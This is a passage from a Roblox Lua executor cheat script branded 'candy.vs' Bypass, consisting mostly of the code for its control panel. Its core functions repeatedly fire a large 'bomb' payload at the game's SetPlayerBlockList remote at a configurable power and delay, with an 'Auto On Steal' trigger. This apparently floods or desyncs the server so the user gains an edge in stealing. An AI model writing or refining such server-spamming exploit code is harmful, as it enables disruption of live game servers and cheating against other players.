	pcall(function() NetworkClient:SetOutgoingKBPSLimit(math.huge) end)
	bypassBomb = buildBomb(BypassConfig.Power)
	local rrs = game:FindFirstChild("RobloxReplicatedStorage")
	local remote = rrs and rrs:FindFirstChild("SetPlayerBlockList")
	if not remote then bypassRunning = false; return end
	bypassThread = task.spawn(function()
	while bypassRunning do
	if bypassBomb then pcall(function() remote:FireServer(bypassBomb) end) end
	task.wait(BypassConfig.SpamDelay)
	end
	end)
	return true
	end

	local function stopBypass(keepNetworkLimit)
	bypassRunning = false
	if bypassThread then pcall(function() task.cancel(bypassThread); bypassThread = nil end) end
	bypassBomb = nil
	if not keepNetworkLimit then
	pcall(function() NetworkClient:SetOutgoingKBPSLimit(math.huge) end)
	end
	end

	local function updateBypassPower(newPower)
	local maximum = BypassConfig.Mode == "PC" and 150000 or 100000
	BypassConfig.Power = math.clamp(newPower, 10000, maximum)
	if BypassConfig.Mode == "PC" then
	BypassConfig.PCPower = BypassConfig.Power
	else
	BypassConfig.MobilePower = BypassConfig.Power
	end
	if bypassRunning then stopBypass(); task.wait(0.05); startBypass() end
	end

	local function switchBypassVersion(version)
	if version ~= "V1" and version ~= "V2" then return end
	BypassConfig.Version = version
	BypassConfig.Power = version == "V1" and 97000 or 100000
	if BypassConfig.Mode == "PC" then
	BypassConfig.PCPower = BypassConfig.Power
	else
	BypassConfig.MobilePower = BypassConfig.Power
	end
	if powerBox then powerBox.Text = tostring(BypassConfig.Power) end
	if bypassRunning then stopBypass(); task.wait(0.05); startBypass() end
	end

	local BYPASS_BACKGROUND_URL = "https://files.catbox.moe/5slzyj.png"
	local BYPASS_BACKGROUND_FILE = "CandyVSBypass_5slzyj.png"
	local BYPASS_BACKGROUND_FALLBACK = "rbxassetid://94763047376005"
	local function resolveBypassBackground()
	local customAssetLoader = nil
	pcall(function()
	customAssetLoader = (typeof(getcustomasset) == "function" and getcustomasset)
	or (typeof(getsynasset) == "function" and getsynasset)
	end)
	if not customAssetLoader or typeof(writefile) ~= "function" or typeof(isfile) ~= "function" then
	return BYPASS_BACKGROUND_FALLBACK
	end
	local hasImage = false
	pcall(function() hasImage = isfile(BYPASS_BACKGROUND_FILE) end)
	if not hasImage then
	local okDownload, imageData = pcall(function() return game:HttpGet(BYPASS_BACKGROUND_URL) end)
	local isPng = okDownload and type(imageData) == "string"
	and imageData:sub(1, 8) == "\137PNG\r\n\26\n"
	if not isPng then
	warn("CandyVS Bypass: no se pudo descargar el fondo 5slzyj")
	return BYPASS_BACKGROUND_FALLBACK
	end
	local okWrite = pcall(writefile, BYPASS_BACKGROUND_FILE, imageData)
	if not okWrite then return BYPASS_BACKGROUND_FALLBACK end
	end
	local okAsset, customAsset = pcall(customAssetLoader, BYPASS_BACKGROUND_FILE)
	if okAsset and type(customAsset) == "string" and customAsset ~= "" then return customAsset end
	return BYPASS_BACKGROUND_FALLBACK
	end

	local BACKGROUNDS = { resolveBypassBackground() }
	local WHITE, NAVY_TEXT = Color3.fromRGB(235,240,245), Color3.fromRGB(30,55,90)

	local SETTINGS_FILE = "CandyVSBypass_Settings.json"
	local powerBox, keybindButton, toggleButton, autoPill, versionButton, pageButton, mainFrame, bgImage, themesFrame
	local pcModeButton, mobileModeButton, updateModeVisuals
	local refreshBypassThemeText
	local bypassMinimized = false
	local currentPage, autoState, boundInput, manualOverride = 1, false, {
	inputType = Enum.UserInputType.Keyboard,
	keyCode = Enum.KeyCode.Five,
	}, false

	local function fileFunctionsAvailable()
	return typeof(writefile) == "function" and typeof(readfile) == "function" and typeof(isfile) == "function"
	end

	local function saveSettings()
	if not fileFunctionsAvailable() or not mainFrame then return end
	local keybindData = boundInput and {inputType = boundInput.inputType.Name, keyCode = boundInput.keyCode.Name} or nil
	local data = {
	power = powerBox and powerBox.Text or "97000",
	pcPower = BypassConfig.PCPower,
	mobilePower = BypassConfig.MobilePower,
	mode = BypassConfig.Mode,
	autoOnSteal = autoState or false,
	keybind = keybindData,
	background = currentPage or 1,
	visible = mainFrame.Visible,
	minimized = bypassMinimized,
	position = {xScale = mainFrame.Position.X.Scale, xOffset = mainFrame.Position.X.Offset, yScale = mainFrame.Position.Y.Scale, yOffset = mainFrame.Position.Y.Offset},
	bypassEnabled = bypassRunning or false,
	manualOverride = manualOverride or false,
	bypassVersion = BypassConfig.Version or "V1"
	}
	pcall(function() writefile(SETTINGS_FILE, HttpService:JSONEncode(data)) end)
	end

	local function loadSettings()
	if not fileFunctionsAvailable() then return nil end
	local ok, result = pcall(function()
	if isfile(SETTINGS_FILE) then return HttpService:JSONDecode(readfile(SETTINGS_FILE)) end
	return nil
	end)
	return ok and result or nil
	end

	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "CandyVSBypassGUI"
	screenGui.ResetOnSpawn = false
	screenGui.IgnoreGuiInset = true
	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	if not candyvsRuntimeState.alive then screenGui:Destroy(); return end
	screenGui.Parent = playerGui
	_G.__CandyVSRegisterThemeRoot(screenGui)

	mainFrame = Instance.new("Frame")
	mainFrame.Name = "MainFrame"
	local bypassWidth = 340
	local bypassHeight = 180
	mainFrame.Size = UDim2.new(0, bypassWidth, 0, bypassHeight)
	mainFrame.Position = UDim2.new(0.5, -bypassWidth / 2, 0.5, -bypassHeight / 2)
	mainFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
	mainFrame.BackgroundTransparency = 0
	mainFrame.BorderSizePixel = 0
	mainFrame.ClipsDescendants = true
	mainFrame.Active = true
	mainFrame.Draggable = false
	mainFrame.Parent = screenGui
	mainFrame.Visible = false
	local bypassAspect = Instance.new("UIAspectRatioConstraint")
	bypassAspect.AspectRatio = bypassWidth / bypassHeight
	bypassAspect.Parent = mainFrame
	if isMobile then
	local mobileScale = Instance.new("UIScale")
	mobileScale.Name = "MobilePanelScale"
	mobileScale.Scale = 0.82
	mobileScale.Parent = mainFrame
	end

	local mainCorner = Instance.new("UICorner", mainFrame)
	mainCorner.Name = "RoundedRectangleCorner"
	mainCorner.CornerRadius = UDim.new(0, 22)
	local mainStroke = Instance.new("UIStroke", mainFrame)
	mainStroke.Color = Color3.fromRGB(181, 181, 181)
	mainStroke.Thickness = 1.5
	mainStroke.Transparency = 1
	mainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

	bgImage = Instance.new("ImageLabel")
	bgImage.Name = "BgImageLabel"
	bgImage.Size = UDim2.new(1,0,1,0)
	bgImage.BackgroundTransparency = 1
	bgImage.Image = BACKGROUNDS[1]
	bgImage.ImageTransparency = 0
	bgImage.ScaleType = Enum.ScaleType.Crop
	bgImage.ZIndex = 0
	bgImage.Parent = mainFrame
	bgImage.Visible = true
	local backgroundCorner = Instance.new("UICorner", bgImage)
	backgroundCorner.Name = "RoundedRectangleBackgroundCorner"
	backgroundCorner.CornerRadius = UDim.new(0, 22)
	_G.__CandyVSRoundPanelBackground(bgImage, mainFrame)
	_G.__CandyVSAddUnifiedPanelShade(mainFrame, 16, 1)
	local glow = Instance.new("UIStroke", mainFrame)
	glow.Name = "Glow"
	glow.Color = Color3.fromRGB(191, 191, 191)
	glow.Thickness = 4
	glow.Transparency = 1
	glow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	local glow2 = Instance.new("UIStroke", mainFrame)
	glow2.Name = "Glow2"
	glow2.Color = Color3.fromRGB(255, 255, 255)
	glow2.Thickness = 6
	glow2.Transparency = 1
	glow2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

	local content = Instance.new("Frame")
	content.Size = UDim2.new(1,0,1,0)
	content.BackgroundTransparency = 1
	content.ZIndex = 3
	content.Parent = mainFrame

	local bypassMinimizeButton = Instance.new("TextButton")
	bypassMinimizeButton.Name = "Minimize"
	bypassMinimizeButton.Size = UDim2.fromOffset(28, 28)
	bypassMinimizeButton.Position = UDim2.new(1, -36, 0, 8)
	bypassMinimizeButton.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
	bypassMinimizeButton.BackgroundTransparency = 0.08
	bypassMinimizeButton.BorderSizePixel = 0
	bypassMinimizeButton.AutoButtonColor = false
	bypassMinimizeButton.Text = "-"
	bypassMinimizeButton.TextColor3 = WHITE
	bypassMinimizeButton.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	bypassMinimizeButton.TextStrokeTransparency = 0.15
	bypassMinimizeButton.TextSize = 18
	bypassMinimizeButton.Font = Enum.Font.FredokaOne
	bypassMinimizeButton.ZIndex = 12
	bypassMinimizeButton.Parent = mainFrame
	Instance.new("UICorner", bypassMinimizeButton).CornerRadius = UDim.new(0, 7)
	local bypassMinimizeStroke = Instance.new("UIStroke", bypassMinimizeButton)
	bypassMinimizeStroke.Color = Color3.fromRGB(0, 0, 0)
	bypassMinimizeStroke.Thickness = 1

	local bypassMinimizedToggle = Instance.new("TextButton")
	bypassMinimizedToggle.Name = "MinimizedToggle"
	bypassMinimizedToggle.Size = UDim2.new(1, -54, 0, 30)
	bypassMinimizedToggle.Position = UDim2.fromOffset(8, 7)
	bypassMinimizedToggle.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
	bypassMinimizedToggle.BackgroundTransparency = 0.08
	bypassMinimizedToggle.BorderSizePixel = 0
	bypassMinimizedToggle.AutoButtonColor = false
	bypassMinimizedToggle.Text = "ACTIVATE BYPASS"
	bypassMinimizedToggle.TextColor3 = WHITE
	bypassMinimizedToggle.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	bypassMinimizedToggle.TextStrokeTransparency = 0.15
	bypassMinimizedToggle.TextSize = 11
	bypassMinimizedToggle.Font = Enum.Font.FredokaOne
	bypassMinimizedToggle.Visible = false
	bypassMinimizedToggle.ZIndex = 12
	bypassMinimizedToggle.Parent = mainFrame
	Instance.new("UICorner", bypassMinimizedToggle).CornerRadius = UDim.new(0, 7)
	local bypassMinimizedStroke = Instance.new("UIStroke", bypassMinimizedToggle)
	bypassMinimizedStroke.Color = Color3.fromRGB(0, 0, 0)
	bypassMinimizedStroke.Thickness = 1

	local bypassExpandedSize = UDim2.fromOffset(bypassWidth, bypassHeight)
	local bypassMinimizedSize = UDim2.fromOffset(310, 44)
	local function refreshBypassMinimizedToggle()
	bypassMinimizedToggle.Text = bypassRunning and "DEACTIVATE BYPASS" or "ACTIVATE BYPASS"
	bypassMinimizedToggle.BackgroundColor3 = bypassRunning and Color3.fromRGB(205, 210, 215) or Color3.fromRGB(35, 35, 35)
	bypassMinimizedToggle.TextColor3 = WHITE
	end
	local function applyBypassMinimized(minimized, animated)
	bypassMinimized = minimized == true
	bypassMinimizeButton.Text = bypassMinimized and "+" or "-"
	content.Visible = not bypassMinimized
	bypassMinimizedToggle.Visible = bypassMinimized
	if bypassMinimized and themesFrame then themesFrame.Visible = false end
	bypassAspect.Parent = bypassMinimized and nil or mainFrame
	local targetSize = bypassMinimized and bypassMinimizedSize or bypassExpandedSize
	if animated then
	TweenService:Create(mainFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = targetSize}):Play()
	else
	mainFrame.Size = targetSize
	end
	end
	bypassMinimizeButton.Activated:Connect(function()
	applyBypassMinimized(not bypassMinimized, true)
	saveSettings()
	end)

	local title = Instance.new("TextLabel")
	title.Size = UDim2.new(0,110,0,20)
	title.Position = UDim2.new(0,16,0,7)
	title.BackgroundTransparency = 1
	title.Font = Enum.Font.FredokaOne
	title.Text = "candy.vs"
	title.TextColor3 = WHITE
	title.TextSize = 16
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.ZIndex = 3
	title.Parent = content

	local titleStroke = Instance.new("UIStroke", title)
	titleStroke.Color = Color3.fromRGB(0, 0, 0)
	titleStroke.Thickness = 1.5
	titleStroke.Transparency = 0.2

	local titleGlow = Instance.new("UIGradient")
	titleGlow.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 220, 255)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 220, 255)),
	})
	titleGlow.Parent = title
	titleGlow.Enabled = false

	local bypassTitle = Instance.new("TextLabel")
	bypassTitle.Name = "BypassLabel"
	bypassTitle.Position = UDim2.new(0,16,0,27)
	bypassTitle.Size = UDim2.new(0,110,0,18)
	bypassTitle.BackgroundTransparency = 1
	bypassTitle.Text = ""
	bypassTitle.TextColor3 = WHITE
	bypassTitle.TextSize = 13
	bypassTitle.Font = Enum.Font.FredokaOne
	bypassTitle.TextXAlignment = Enum.TextXAlignment.Left
	bypassTitle.ZIndex = 3
	bypassTitle.Parent = content
	title.AnchorPoint = Vector2.new(0.5, 0)
	title.Position = UDim2.new(0.5, 0, 0, 44)
	title.Size = UDim2.fromOffset(224, 26)
	_G.__CandyVSAddOriginalGui3Title(title, "Bypass")
	title.Visible = false



	local titleShadow = Instance.new("TextLabel")
	titleShadow.Name = "TitleShadow"
	titleShadow.Size = UDim2.new(1, 0, 0, 50)
	titleShadow.Position = UDim2.new(0, -7, 0, 1)
	titleShadow.BackgroundTransparency = 1
	titleShadow.Font = Enum.Font.FredokaOne
	titleShadow.Text = ""
	titleShadow.TextColor3 = Color3.fromRGB(20, 50, 100)
	titleShadow.TextSize = 18
	titleShadow.TextXAlignment = Enum.TextXAlignment.Center
	titleShadow.ZIndex = 2
	titleShadow.Parent = content
	titleShadow.Visible = false

	pageButton = Instance.new("TextButton")
	pageButton.AnchorPoint = Vector2.new(0.5,0)
	pageButton.Size = UDim2.new(0,90,0,20)
	pageButton.Position = UDim2.new(0.5,0,0,38)
	pageButton.BackgroundColor3 = WHITE
	pageButton.BackgroundTransparency = 0.55
	pageButton.AutoButtonColor = false
	pageButton.Font = Enum.Font.FredokaOne
	pageButton.Text = "Themes"
	pageButton.Visible = true
	pageButton.TextWrapped = false
	pageButton.TextXAlignment = Enum.TextXAlignment.Center
	pageButton.TextColor3 = NAVY_TEXT
	pageButton.TextSize = 10
	pageButton.Parent = content
	pageButton.Visible = false
	Instance.new("UICorner", pageButton).CornerRadius = UDim.new(0,6)
	local pageStroke = Instance.new("UIStroke", pageButton)
	pageStroke.Color = Color3.fromRGB(0, 0, 0)
	pageStroke.Thickness = 1
	pageStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	themesFrame = Instance.new("Frame")
	themesFrame.Name = "ThemesPanel"
	themesFrame.Size = UDim2.fromOffset(220, 180)
	themesFrame.BackgroundColor3 = Color3.fromRGB(72, 72, 72)
	themesFrame.BorderSizePixel = 0
	themesFrame.Visible = false
	themesFrame.ZIndex = 20
	themesFrame.Parent = screenGui
	local themesGradient = Instance.new("UIGradient", themesFrame)
	themesGradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(58, 58, 58)),
	ColorSequenceKeypoint.new(0.48, Color3.fromRGB(92, 92, 92)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(52, 52, 52)),
	})
	themesGradient.Rotation = 35
	local function positionThemesPanel()
	themesFrame.Position = UDim2.new(
	mainFrame.Position.X.Scale, mainFrame.Position.X.Offset + mainFrame.Size.X.Offset + 12,
	mainFrame.Position.Y.Scale, mainFrame.Position.Y.Offset
	)
	end
	Instance.new("UICorner", themesFrame).CornerRadius = UDim.new(0, 12)
	local themesStroke = Instance.new("UIStroke", themesFrame)
	themesStroke.Color = mainStroke.Color
	themesStroke.Thickness = mainStroke.Thickness

	local pendingPage = currentPage
	local themeCards = {}
	local function refreshThemeCards()
	for index, card in ipairs(themeCards) do
	local selected = index == pendingPage
	card.stroke.Color = WHITE
	card.stroke.Thickness = selected and 2 or 1.5
	card.stroke.Transparency = selected and 0.25 or 0.7
	card.stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

	local baseX = card.baseX or card.Position.X.Offset
	local baseY = card.baseY or card.Position.Y.Offset
	local baseW = card.baseW or card.Size.X.Offset
	local baseH = card.baseH or card.Size.Y.Offset

	card.card.Size = selected and UDim2.fromOffset(math.max(4, baseW - 6), math.max(4, baseH - 6)) or UDim2.fromOffset(baseW, baseH)
	card.card.Position = selected and UDim2.new(0, baseX + 3, 0, baseY + 3) or UDim2.new(0, baseX, 0, baseY)
	card.image.Size = UDim2.new(1, 0, 1, 0)
	card.image.Position = UDim2.new(0, 0, 0, 0)
	end
	end
	for index, imageId in ipairs(BACKGROUNDS) do
	local card = Instance.new("TextButton", themesFrame)
	local baseX = 12 + ((index - 1) % 2) * 98
	local baseY = 12 + math.floor((index - 1) / 2) * 62
	card.Size = UDim2.fromOffset(88, 56)
	card.Position = UDim2.new(0, baseX, 0, baseY)
	card.BackgroundColor3 = WHITE
	card.BorderSizePixel = 0
	card.Text = ""
	card.AutoButtonColor = false
	card.ZIndex = 21
	Instance.new("UICorner", card).CornerRadius = UDim.new(0, 7)
	local cardImage = Instance.new("ImageLabel", card)
	cardImage.Size = UDim2.new(1, 0, 1, 0)
	cardImage.BackgroundTransparency = 1
	cardImage.Image = imageId
	cardImage.ScaleType = Enum.ScaleType.Crop
	cardImage.ZIndex = 21
	Instance.new("UICorner", cardImage).CornerRadius = UDim.new(0, 7)
	local cardLabel = Instance.new("TextLabel", card)
	cardLabel.Size = UDim2.new(1, -6, 0, 14)
	cardLabel.Position = UDim2.new(0, 3, 1, -16)
	cardLabel.BackgroundTransparency = 1
	cardLabel.Text = "GUI " .. tostring(index)
	cardLabel.TextColor3 = WHITE
	cardLabel.TextSize = 8
	cardLabel.Font = Enum.Font.FredokaOne
	cardLabel.ZIndex = 23
	cardLabel.TextStrokeColor3 = Color3.fromRGB(5, 12, 25)
	cardLabel.TextStrokeTransparency = 0.25
	local cardStroke = Instance.new("UIStroke", card)
	cardStroke.Color = Color3.fromRGB(0, 0, 0)
	cardStroke.Thickness = 1
	cardStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	table.insert(themeCards, {
	card = card,
	stroke = cardStroke,
	image = cardImage,
	baseX = baseX,
	baseY = baseY,
	baseW = 88,
	baseH = 56,
	})
	card.Activated:Connect(function()
	pendingPage = index
	refreshThemeCards()
	end)
	end
	local saveThemeButton = Instance.new("TextButton", themesFrame)
	saveThemeButton.Size = UDim2.new(1, -24, 0, 28)
	saveThemeButton.Position = UDim2.new(0, 12, 1, -44)
	saveThemeButton.BackgroundColor3 = Color3.fromRGB(105, 105, 105)
	saveThemeButton.BorderSizePixel = 0
	saveThemeButton.Text = "Save Theme"
	saveThemeButton.TextColor3 = WHITE
	saveThemeButton.TextSize = 11
	saveThemeButton.Font = Enum.Font.FredokaOne
	saveThemeButton.ZIndex = 21
	Instance.new("UICorner", saveThemeButton).CornerRadius = UDim.new(0, 7)
	saveThemeButton.Activated:Connect(function()
	currentPage = pendingPage
	bgImage.Image = BACKGROUNDS[currentPage]
	_G.__CandyVSFramePanelBackground(bgImage, currentPage, "Bypass")
	mainStroke.Transparency = currentPage == 1 and 1 or 0.448
	glow.Transparency = currentPage == 1 and 1 or 0.782
	glow2.Transparency = currentPage == 1 and 1 or 0.891
	if refreshBypassThemeText then refreshBypassThemeText() end
	themesFrame.Visible = false
	saveSettings()
	end)
	pageButton.Activated:Connect(function()
	pendingPage = currentPage
	positionThemesPanel()
	themesFrame.Visible = not themesFrame.Visible
	refreshThemeCards()
	end)

	versionButton = Instance.new("TextButton")
	versionButton.AnchorPoint = Vector2.new(0,0)
	versionButton.Size = UDim2.new(0,44,0,22)
	versionButton.Position = UDim2.new(0,16,0,13)
	versionButton.BackgroundColor3 = Color3.fromRGB(28,28,28)
	versionButton.BackgroundTransparency = 0.3
	versionButton.AutoButtonColor = false
	versionButton.Font = Enum.Font.FredokaOne
	versionButton.Text = "V1"
	versionButton.TextColor3 = NAVY_TEXT
	versionButton.TextSize = 10
	versionButton.Parent = content
	Instance.new("UICorner", versionButton).CornerRadius = UDim.new(0,6)
	local versionStroke = Instance.new("UIStroke", versionButton)
	versionStroke.Color = Color3.fromRGB(0, 0, 0)
	versionStroke.Thickness = 1
	versionStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

	local function updateVersionButton()
	versionButton.Text = BypassConfig.Version
	versionButton.TextColor3 = WHITE
	versionStroke.Color = Color3.fromRGB(0, 0, 0)
	end

	versionButton.Activated:Connect(function()
	switchBypassVersion(BypassConfig.Version == "V1" and "V2" or "V1")
	updateVersionButton()
	saveSettings()
	end)

	local modeFrame = Instance.new("Frame")
	modeFrame.Name = "PCToggleFrame"
	modeFrame.AnchorPoint = Vector2.new(0.5,0)
	modeFrame.Position = UDim2.new(0.5,0,0,13)
	modeFrame.Size = UDim2.new(0,100,0,22)
	modeFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
	modeFrame.BackgroundTransparency = 0.4
	modeFrame.Parent = content
	Instance.new("UICorner", modeFrame).CornerRadius = UDim.new(0,6)
	local modeStroke = Instance.new("UIStroke", modeFrame)
	modeStroke.Color = Color3.fromRGB(40,40,40)
	modeStroke.Transparency = 0.3

	pcModeButton = Instance.new("TextButton")
	pcModeButton.Position = UDim2.new(0,2,0,2)
	pcModeButton.Size = UDim2.new(0.5,-2,1,-4)
	pcModeButton.BackgroundTransparency = 0.4
	pcModeButton.Text = "PC"
	pcModeButton.TextSize = 9
	pcModeButton.Font = Enum.Font.FredokaOne
	pcModeButton.AutoButtonColor = false
	pcModeButton.Parent = modeFrame
	Instance.new("UICorner", pcModeButton).CornerRadius = UDim.new(0,5)

	mobileModeButton = Instance.new("TextButton")
	mobileModeButton.Position = UDim2.new(0.5,2,0,2)
	mobileModeButton.Size = UDim2.new(0.5,-2,1,-4)
	mobileModeButton.BackgroundTransparency = 0.4
	mobileModeButton.Text = "Mobile"
	mobileModeButton.TextSize = 9
	mobileModeButton.Font = Enum.Font.FredokaOne
	mobileModeButton.AutoButtonColor = false
	mobileModeButton.Parent = modeFrame
	Instance.new("UICorner", mobileModeButton).CornerRadius = UDim.new(0,5)

	local powerRow = Instance.new("Frame")
	powerRow.Name = "PowerRow"
	powerRow.Position = UDim2.new(0,22,0,74)
	powerRow.Size = UDim2.new(1,-44,0,40)
	powerRow.BackgroundColor3 = Color3.fromRGB(22,22,22)
	powerRow.BackgroundTransparency = 0.4
	powerRow.Parent = content
	Instance.new("UICorner", powerRow).CornerRadius = UDim.new(0,10)
	local powerRowStroke = Instance.new("UIStroke", powerRow)
	powerRowStroke.Color = Color3.fromRGB(40,40,40)
	powerRowStroke.Transparency = 0.3

	local powerLabel = Instance.new("TextLabel")
	powerLabel.Size = UDim2.new(0,38,1,0)
	powerLabel.Position = UDim2.new(0,8,0,0)
	powerLabel.BackgroundTransparency = 1
	powerLabel.Text = "POWER"
	powerLabel.TextColor3 = WHITE
	powerLabel.TextTransparency = 0
	powerLabel.TextSize = 8
	powerLabel.Font = Enum.Font.FredokaOne
	powerLabel.TextXAlignment = Enum.TextXAlignment.Left
	powerLabel.Parent = powerRow

	powerBox = Instance.new("TextBox")
	powerBox.Size = UDim2.new(0,60,0,24)
	powerBox.Position = UDim2.new(0,46,0,8)
	powerBox.BackgroundColor3 = Color3.fromRGB(30,30,30)
	powerBox.BackgroundTransparency = 0.4
	powerBox.Font = Enum.Font.FredokaOne
	powerBox.Text = "97000"
	powerBox.PlaceholderText = "97000"
	powerBox.TextColor3 = WHITE
	powerBox.TextSize = 10
	powerBox.ClearTextOnFocus = false
	powerBox.ZIndex = 4
	powerBox.Parent = powerRow
	Instance.new("UICorner", powerBox).CornerRadius = UDim.new(0,6)
	local powerStroke = Instance.new("UIStroke", powerBox)
	powerStroke.Color = Color3.fromRGB(0, 0, 0)
	powerStroke.Thickness = 1.2
	powerStroke.Transparency = 0.2

	powerBox:GetPropertyChangedSignal("Text"):Connect(function()
	local filtered = powerBox.Text:gsub("%D", "")
	if filtered ~= powerBox.Text then powerBox.Text = filtered end
	end)

	powerBox.FocusLost:Connect(function()
	local val = tonumber(powerBox.Text)
	if val then
	local maximum = BypassConfig.Mode == "PC" and 150000 or 100000
	local clamped = math.clamp(val, 10000, maximum)
	powerBox.Text = tostring(clamped)
	updateBypassPower(clamped)
	else
	powerBox.Text = tostring(BypassConfig.Power)
	end
	saveSettings()
	end)

	local keybindLabel = Instance.new("TextLabel")
	keybindLabel.Size = UDim2.new(0.8,0,0,20)
	keybindLabel.Position = UDim2.new(0.1,0,0,135)
	keybindLabel.BackgroundTransparency = 1
	keybindLabel.Text = "KEYBIND"
	keybindLabel.TextColor3 = WHITE
	keybindLabel.TextTransparency = 0.25
	keybindLabel.TextSize = 10
	keybindLabel.Font = Enum.Font.FredokaOne
	keybindLabel.TextXAlignment = Enum.TextXAlignment.Left
	keybindLabel.Parent = content
	keybindLabel.Visible = false

	keybindButton = Instance.new("TextButton")
	keybindButton.Size = UDim2.new(0,30,0,24)
	keybindButton.Position = UDim2.new(1,-34,0,8)
	keybindButton.BackgroundColor3 = Color3.fromRGB(30,30,30)
	keybindButton.BackgroundTransparency = 0.4
	keybindButton.AutoButtonColor = false
	keybindButton.Font = Enum.Font.FredokaOne
	keybindButton.Text = "5"
	keybindButton.TextColor3 = WHITE
	keybindButton.TextSize = 10
	keybindButton.ZIndex = 4
	keybindButton.Parent = powerRow
	Instance.new("UICorner", keybindButton).CornerRadius = UDim.new(0,6)
	local keybindStroke = Instance.new("UIStroke", keybindButton)
	keybindStroke.Color = Color3.fromRGB(0, 0, 0)
	keybindStroke.Thickness = 1.2
	keybindStroke.Transparency = 0.2

	toggleButton = Instance.new("TextButton")
	toggleButton.AnchorPoint = Vector2.new(0,0)
	toggleButton.Size = UDim2.new(1,-150,0,32)
	toggleButton.Position = UDim2.new(0,112,0,4)
	toggleButton.BackgroundColor3 = Color3.fromRGB(35,35,35)
	toggleButton.BackgroundTransparency = 0.1
	toggleButton.AutoButtonColor = false
	toggleButton.Font = Enum.Font.FredokaOne
	toggleButton.Text = "ACTIVATE BYPASS"
	toggleButton.TextColor3 = WHITE
	toggleButton.TextSize = 9
	toggleButton.Parent = powerRow
	Instance.new("UICorner", toggleButton).CornerRadius = UDim.new(0,8)
	local toggleStroke = Instance.new("UIStroke", toggleButton)
	toggleStroke.Color = Color3.fromRGB(0, 0, 0)
	toggleStroke.Thickness = 1.2
	toggleStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	local toggleGradient = Instance.new("UIGradient")
	toggleGradient.Color = ColorSequence.new(Color3.fromRGB(96, 96, 96), Color3.fromRGB(68, 68, 68))
	toggleGradient.Rotation = 90
	toggleGradient.Parent = toggleButton
	toggleGradient.Enabled = false
	local toggleScale = Instance.new("UIScale", toggleButton)
	toggleScale.Scale = 1

	local autoRow = Instance.new("Frame")
	autoRow.Size = UDim2.new(1,-44,0,24)
	autoRow.Position = UDim2.new(0,22,0,118)
	autoRow.BackgroundColor3 = Color3.fromRGB(22,22,22)
	autoRow.BackgroundTransparency = 0.4
	autoRow.Parent = content
	Instance.new("UICorner", autoRow).CornerRadius = UDim.new(0,8)
	local autoRowStroke = Instance.new("UIStroke", autoRow)
	autoRowStroke.Color = Color3.fromRGB(40,40,40)
	autoRowStroke.Transparency = 0.3

	autoPill = Instance.new("TextButton")
	autoPill.Size = UDim2.new(0,28,0,14)
	autoPill.Position = UDim2.new(1,-38,0.5,-7)
	autoPill.BackgroundColor3 = Color3.fromRGB(20,20,20)
	autoPill.BackgroundTransparency = 0.4
	autoPill.AutoButtonColor = false
	autoPill.Text = ""
	autoPill.Parent = autoRow
	Instance.new("UICorner", autoPill).CornerRadius = UDim.new(1,0)
	local autoPillStroke = Instance.new("UIStroke", autoPill)
	autoPillStroke.Color = Color3.fromRGB(0,0,0)
	autoPillStroke.Thickness = 1.2

	local autoKnob = Instance.new("Frame")
	autoKnob.Size = UDim2.new(0,10,0,10)
	autoKnob.Position = UDim2.new(0,2,0.5,-5)
	autoKnob.BackgroundColor3 = Color3.fromRGB(60,60,60)
	autoKnob.BorderSizePixel = 0
	autoKnob.Parent = autoPill
	Instance.new("UICorner", autoKnob).CornerRadius = UDim.new(1,0)

	local autoLabel = Instance.new("TextLabel")
	autoLabel.Size = UDim2.new(0.5,0,1,0)
	autoLabel.Position = UDim2.new(0,10,0,0)
	autoLabel.BackgroundTransparency = 1
	autoLabel.Font = Enum.Font.FredokaOne
	autoLabel.Text = "Auto On Steal"
	autoLabel.TextColor3 = NAVY_TEXT
	autoLabel.TextSize = 9
	autoLabel.TextXAlignment = Enum.TextXAlignment.Left
	autoLabel.TextYAlignment = Enum.TextYAlignment.Center
	autoLabel.Parent = autoRow

	updateModeVisuals = function()
	local pcSelected = BypassConfig.Mode == "PC"
	pcModeButton.BackgroundColor3 = pcSelected and Color3.fromRGB(55,55,55) or Color3.fromRGB(18,18,18)
	pcModeButton.TextColor3 = pcSelected and WHITE or Color3.fromRGB(80,80,80)
	mobileModeButton.BackgroundColor3 = pcSelected and Color3.fromRGB(18,18,18) or Color3.fromRGB(55,55,55)
	mobileModeButton.TextColor3 = pcSelected and Color3.fromRGB(80,80,80) or WHITE
	keybindButton.Visible = pcSelected
	powerBox.Size = UDim2.new(0,60,0,24)
	end

	local function selectMode(mode)
	if mode ~= "PC" and mode ~= "Mobile" then return end
	if BypassConfig.Mode == mode then return end
	local wasRunning = bypassRunning
	if wasRunning then stopBypass() end
	BypassConfig.Mode = mode
	BypassConfig.Power = mode == "PC" and BypassConfig.PCPower or BypassConfig.MobilePower
	powerBox.Text = tostring(BypassConfig.Power)
	updateModeVisuals()
	if wasRunning then startBypass() end
	saveSettings()
	end

	pcModeButton.Activated:Connect(function() selectMode("PC") end)
	mobileModeButton.Activated:Connect(function() selectMode("Mobile") end)
	updateModeVisuals()

	refreshBypassThemeText = function()
	title.Visible = false
	local useWhiteText = true
	pageButton.TextColor3 = useWhiteText and WHITE or NAVY_TEXT
